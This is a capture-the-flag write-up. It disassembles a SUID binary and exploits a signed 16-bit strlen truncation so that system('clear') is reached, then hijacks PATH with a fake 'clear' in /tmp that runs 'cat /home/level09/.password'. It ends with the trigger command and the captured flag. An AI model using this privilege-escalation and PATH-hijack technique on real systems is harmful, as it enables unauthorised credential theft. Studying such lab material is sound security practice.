## exploit


We've got only ELF file and we must find right vuln. to read `.password` file
```assembly
	08048464 <main>:
	 8048464:	55                   	push   %ebp
	 8048465:	89 e5                	mov    %esp,%ebp
	 8048467:	83 e4 f0             	and    $0xfffffff0,%esp
	 804846a:	83 ec 20             	sub    $0x20,%esp
	 804846d:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
	 8048471:	7f 1d                	jg     8048490 <main+0x2c>
	 8048473:	8b 45 0c             	mov    0xc(%ebp),%eax
	 8048476:	8b 10                	mov    (%eax),%edx
	 8048478:	b8 c0 85 04 08       	mov    $0x80485c0,%eax
	 804847d:	89 54 24 04          	mov    %edx,0x4(%esp)
	 8048481:	89 04 24             	mov    %eax,(%esp)
	 8048484:	e8 ff fe ff ff       	call   8048388 <printf@plt>
	 8048489:	b8 00 00 00 00       	mov    $0x0,%eax
	 804848e:	eb 60                	jmp    80484f0 <main+0x8c>
	 8048490:	8b 45 0c             	mov    0xc(%ebp),%eax
	 8048493:	83 c0 04             	add    $0x4,%eax
	 8048496:	8b 00                	mov    (%eax),%eax
	 8048498:	89 04 24             	mov    %eax,(%esp)
	 804849b:	e8 d8 fe ff ff       	call   8048378 <strlen@plt>
	 80484a0:	66 89 44 24 1e       	mov    %ax,0x1e(%esp)
	 80484a5:	66 83 7c 24 1e 00    	cmpw   $0x0,0x1e(%esp)
	 80484ab:	79 32                	jns    80484df <main+0x7b>
	 80484ad:	c7 04 24 d8 85 04 08 	movl   $0x80485d8,(%esp)
	 80484b4:	e8 df fe ff ff       	call   8048398 <puts@plt>
	 80484b9:	c7 04 24 f5 85 04 08 	movl   $0x80485f5,(%esp)
	 80484c0:	e8 d3 fe ff ff       	call   8048398 <puts@plt>
	 80484c5:	c7 04 24 0b 86 04 08 	movl   $0x804860b,(%esp)
	 80484cc:	e8 c7 fe ff ff       	call   8048398 <puts@plt>
	 80484d1:	c7 04 24 27 86 04 08 	movl   $0x8048627,(%esp)
	 80484d8:	e8 7b fe ff ff       	call   8048358 <system@plt>
	 80484dd:	eb 0c                	jmp    80484eb <main+0x87>
	 80484df:	c7 04 24 2d 86 04 08 	movl   $0x804862d,(%esp)
	 80484e6:	e8 ad fe ff ff       	call   8048398 <puts@plt>
	 80484eb:	b8 00 00 00 00       	mov    $0x0,%eax
	 80484f0:	c9                   	leave  
	 80484f1:	c3                   	ret
```
As we can see is required one argument.
We can notice that the program performs a call to `system("clear")` without specifying absolute path.
So the idea is to:
* find a way to reach that system
* put a clear.c program in tmp that cat the flag
* exporting in PATH env var before `usr/bin` our `tmp` directory
* execute suid program

The program takes the least 16 bits of the integer that represent length of our argument.
These bits are treat as signed bit, so we have the last bit as sign.

If these bits represent non-positive number, then the execution continue and the program perform a system launching clear command.



I obtain, with `which` command, the path of `clear` command(/usr/bin).
Then we create in `/tmp/ourdir` a `.c` file named `clear` which contains a system with `cat /home/level09/.password` argument.


We can exploit the program: export PATH env. variable and put `/tmp/ourdir` before `/usr/bin`.
The idea is that when SUID program perform `clear` with `system`, will search first in our directory and will find a clear binary that perform a cat to flag file.


So we go back in ur directory and we launch:		
```bash
$ ./bin09 $(python -c 'print "a"*65535')
```

##### flag: "#FAILstrlen#F411"

	


